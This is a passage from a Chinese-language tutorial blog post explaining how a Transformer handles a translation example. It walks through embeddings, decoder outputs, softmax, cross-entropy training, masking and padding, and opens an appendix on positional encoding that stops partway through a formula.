<li>源语言（中文）分词：<code>[“我”, “喜欢”, “深度学习”]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">L_{src}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3</span></span></span></span></span>。</li>
<li>目标语言（英文）分词并添加特殊标记：
<ul>
<li>解码器输入：<code>[“&lt;sos&gt;”, “I”, “like”, “deep”, “learning”]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{out}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>。</li>
<li>标签：<code>[“I”, “like”, “deep”, “learning”,"&lt;eos&gt;"]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{tgt}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>。</li>
</ul>
</li>
</ul>
<p>注意这里要给目标句子加上开始标签<code>&lt;sos&gt;</code>和结束标签<code>&lt;eos&gt;</code>，要不然解码器就不知道从哪里开始，到哪里结束生成一个句子了。</p>
<p>若你对词向量（word embeddings）或特殊标记的作用还不熟悉，建议先了解自然语言处理中的词表示基础。不过没关系，我马上就会写一篇专门关于词向量的新的文章，即使0基础自然语言处理也能看懂，看到这里不妨给我个关注吧。(๑˃̵ᴗ˂̵)و  ✨</p>
<p>分词后的序列通过词嵌入层转换为稠密向量表示：</p>
<ul>
<li>中文序列通过一个嵌入层（Embedding1）转换为词向量矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{src}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
<li>英文序列通过另一个嵌入层（Embedding2）转换为词向量矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 假设 维度 = 512</span>
X_src = [[<span class="hljs-number">0.12</span>, <span class="hljs-number">0.71</span>, ..., <span class="hljs-number">0.32</span>],  <span class="hljs-comment"># “我”的词向量</span>
         [<span class="hljs-number">0.15</span>, <span class="hljs-number">0.31</span>, ..., <span class="hljs-number">0.46</span>],  <span class="hljs-comment"># “喜欢”的词向量</span>
         [<span class="hljs-number">0.09</span>, <span class="hljs-number">0.52</span>, ..., <span class="hljs-number">0.87</span>]]  <span class="hljs-comment"># “深度学习”的词向量</span>

X_out = [[<span class="hljs-number">0.01</span>, <span class="hljs-number">0.80</span>, ..., <span class="hljs-number">0.10</span>],  <span class="hljs-comment"># &lt;sos&gt;</span>
         [<span class="hljs-number">0.45</span>, <span class="hljs-number">0.23</span>, ..., <span class="hljs-number">0.67</span>],  <span class="hljs-comment"># “I”</span>
         [<span class="hljs-number">0.33</span>, <span class="hljs-number">0.19</span>, ..., <span class="hljs-number">0.55</span>],  <span class="hljs-comment"># “like”</span>
         [<span class="hljs-number">0.87</span>, <span class="hljs-number">0.41</span>, ..., <span class="hljs-number">0.22</span>],  <span class="hljs-comment"># “deep”</span>
         [<span class="hljs-number">0.29</span>, <span class="hljs-number">0.64</span>, ..., <span class="hljs-number">0.38</span>]]  <span class="hljs-comment"># “learning”</span>
</code></pre>
<p>这两个矩阵输入到Transformer中后经过一通计算，最后在解码器最后一层输出的就是和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>相同形状的矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span>，例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 解码器输出示意（每个向量对应一个时间步的表示）</span>
O =  [[<span class="hljs-number">0.74</span>, <span class="hljs-number">0.22</span>, ..., <span class="hljs-number">0.62</span>],  <span class="hljs-comment"># 对应 "&lt;sos&gt;" 位置的输出 , 最终要和标签"I"作损失</span>
      [<span class="hljs-number">0.35</span>, <span class="hljs-number">0.58</span>, ..., <span class="hljs-number">0.56</span>],  <span class="hljs-comment"># 对应 "I" 位置的输出 , 最终要和标签"like"作损失</span>
      [<span class="hljs-number">0.53</span>, <span class="hljs-number">0.40</span>, ..., <span class="hljs-number">0.41</span>],  <span class="hljs-comment"># 对应 "like" , 和标签"deep"作损失</span>
      [<span class="hljs-number">0.18</span>, <span class="hljs-number">0.63</span>, ..., <span class="hljs-number">0.79</span>],  <span class="hljs-comment"># 对应 "deep" , 和标签"learning"作损失</span>
      [<span class="hljs-number">0.07</span>, <span class="hljs-number">0.73</span>, ..., <span class="hljs-number">0.24</span>]]  <span class="hljs-comment"># 对应 "learning" , 和标签"&lt;eos&gt;"作损失</span>
</code></pre>
<p>最后，矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span> 经过一个线性层（Linear），将维度从 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span> 映射到英文词表大小 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>，得到矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>。接着，对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span> 的每一行应用 softmax 函数，将其转换为一个概率分布矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>：</p>
<p>其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个时间步（对应目标序列第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个位置）生成词表中第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个词的概率。最终 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 的每一行都是一个在词表上的概率分布，例如第一行对应从 <code>&lt;sos&gt;</code> 之后生成第一个词的概率分布，第二行对应生成第二个词的概率分布，依此类推。</p>
<p>在训练时，我们使用交叉熵损失函数比较 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 与真实目标序列的 one-hot 标签，具体而言，对于目标序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{tgt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>=<code>[I,like,deep,learning,&lt;eos&gt;]</code>，我们将其转化为 one-hot 向量形式。由于英文词表大小为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>，则每个单词对应一个<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>维的 one-hot 向量，其中对应单词索引的位置为 1，其余为 0。</p>
<p>不要忘了，解码器是带有掩码的，因此序列中的每个子序列都是看不到它的下一个词的，但是能看到它前面的所有词。正是因为如此，它才能这样进行训练。</p>
<p>这其实也就是意味着，如果未来在编码器输入“我喜欢深度学习”的情况下，我在解码器输入<code>[&lt;sos&gt;]</code>，我期望它输出<code>[I]</code>的概率最大；在解码器输入<code>[&lt;sos&gt;，I]</code>，我期望它输出<code>[I，like]</code>；在解码器输入<code>[&lt;sos&gt;，I，like]</code>，我期望它输出<code>[I，like，deep]</code>；在解码器输入<code>[&lt;sos&gt;，I，like，deep]</code>，我期望它输出<code>[I，like，deep，learning]</code>；在解码器输入<code>[&lt;sos&gt;，I，like，deep，learning]</code>，我期望它输出<code>[I，like，deep，learning，&lt;eos&gt;]</code>，最后在遇见<code>&lt;eos&gt;</code>或者输出长度到达预设上限时就停止输入，完成生成。</p>
<p>通常在推理中，采用自回归的方式生成序列，我们只取输出序列的最后一个位置的输出（仅关注最新一步的预测结果），将其加入到输入序列的末尾再次进行输入(就像上面演示的那样)。但是，这种逐词生成的方式在长序列任务中会导致效率问题，因为每一步都需要重新计算整个序列的表示。不过目前已有许多优化方法，但这已超出本篇基础指南的范畴。就不过多介绍了。</p>
<blockquote>
<p><strong>题外话：</strong></p>
<p>上面的例子是使用单一样本进行训练的，而在实际训练中，为了提高硬件利用率和训练稳定性，我们通常会采用<strong>批次训练</strong>（Batch）。此时，输入的张量形状将变为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mtext>？</mtext><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(batch\_size, seq\_len？, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">？</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>。</p>
<p>但这里存在一个现实问题，就是同一个批次中的句子长度往往各不相同。无法直接组合成一个张量，因此也就无法输入到Transformer中进行训练。</p>
<p>常用的解决方法就是引入填充机制，即在较短序列的末尾添加特殊的填充符号（如<code>&lt;pad&gt;</code>），使该批次中所有序列长度一致。然后在模型中添加掩码来屏蔽填充位置的影响，具体来说就是在注意力机制中，将填充位置对应的注意力权重设置为一个极小的值（如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></span>），使得在 softmax 之后这些位置的权重接近 0。更加具体的操作方式就不在这里讲解了，感兴趣的朋友可以自己去搜索资料了解学习。</p>
</blockquote>
<p>不知你是否注意到，Transformer 这种逐词生成模式，与如今对话式大语言模型的响应方式如出一辙——是的，这正是因为 <strong>GPT 系列模型本质上就是由 Transformer 的解码器部分演变而来</strong>。仅使用编码器部分，则构成了另一里程碑模型 <strong>BERT</strong> 的核心架构。到这里，你已经离当今的大语言模型的本质又更进一步！</p>
<p>至此，你已经掌握了 Transformer 的核心架构与运行逻辑。那么，在你未来的实际项目中，是否每次都需要“全盘照搬”整个Transformer结构呢？<strong>我觉得并不需要</strong>。Transformer 的强大之处恰恰在于其<strong>模块化设计</strong>：你可以根据任务需要，灵活选取其中的自注意力层、交叉注意力层、位置编码等组件，甚至对它们进行改造或重组，反正你都已经了解它的原理了，拆开重构也不是什么难事。</p>
<p>这种“拆解-重组-创新”的思维，正是深度学习模型演进中的常见路径。其实到这里，你会发现，那些令人生畏的前沿网络架构，其实大多是由我们熟悉的基本模块——如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Softmax</mtext></mrow><annotation encoding="application/x-tex">\text{Softmax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">Softmax</span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Linear</mtext></mrow><annotation encoding="application/x-tex">\text{Linear}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord">Linear</span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LayerNorm</mtext></mrow><annotation encoding="application/x-tex">\text{LayerNorm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">LayerNorm</span></span></span></span></span></span>、残差连接，CNN等——通过巧妙的排列组合而来。例如，将 Transformer 的自注意力与卷积模块结合，便催生了 <strong>ConvTransformer</strong>；在视觉任务中仅使用编码器并调整注意力机制，就诞生了 <strong>Vision Transformer (ViT)</strong>。有时候，仅仅是两个已有结构的有机融合，就能在特定任务上取得突破，这本身就是一个重要的创新方向。</p>
<p><strong>真正的学习，始于理解，成于重构，最终抵达创新</strong>。不妨从一个小实验开始。理论与实践的交汇处，正是灵感迸发的地方。未来或许有一天，你会站在这些基础模块之上，搭建出属于自己、甚至影响某个领域的新架构。期待你在理解 Transformer 之后，不仅能复现它，更能拆解它、改进它，最终超越它。深度学习的世界里，没有终极的模型，只有不断演进的思想——而读到这里的你，已经走在了这条路上。</p>
<h3 data-id="heading-1">附录1：位置编码</h3>
<p>如上文所述，自注意力机制能够出色地捕捉序列元素之间的相关性，但其计算过程本质上是<strong>无序的</strong>——它无法区分“我爱自然语言处理”与“自然语言处理爱我”之间的顺序差异。为了弥补这一关键缺陷，我们需要为模型引入<strong>位置信息</strong>。</p>
<p>位置编码的核心思想非常直观：为序列中每个位置的词向量添加一个独特的“位置标记”。这个标记是一个与词向量维度相同的向量，最终通过<strong>相加</strong>的方式与原始词向量融合，从而让每个输入都“记住”自己在序列中的位置。</p>
<p>一个最直观的方案：用二进制或自然数的独热编码来表示位置。例如，对于一个三维向量，可以这样设计位置编码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 原始输入序列 (例如3个词，每个词用3维向量表示)</span>
X = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">0.51</span>],
     [<span class="hljs-number">4.12</span>, <span class="hljs-number">5.10</span>, <span class="hljs-number">3.11</span>],
     [<span class="hljs-number">0.41</span>, <span class="hljs-number">3.71</span>, <span class="hljs-number">1.33</span>]]

<span class="hljs-comment"># 一种简单的位置编码（此处仅为示意，并非Transformer实际所用）</span>
P_simple = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],  <span class="hljs-comment"># 位置0</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># 位置1</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># 位置2</span>

<span class="hljs-comment"># 融合了位置信息的最终输入</span>
X_input = X + P_simple = = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">1.51</span>],
     						[<span class="hljs-number">4.12</span>, <span class="hljs-number">6.10</span>, <span class="hljs-number">3.11</span>],
     						[<span class="hljs-number">0.41</span>, <span class="hljs-number">4.71</span>, <span class="hljs-number">2.33</span>]]
</code></pre>
<p>对，就是这么简单粗暴，只不过一般情况下，我们不用二进制递增序列来表示位置编码向量，而是用正余弦位置编码序列来表示（原论文中的方法）。但其本质都是一样的。</p>
<p>对照上述的例子，正余弦位置编码矩阵如下所示</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" 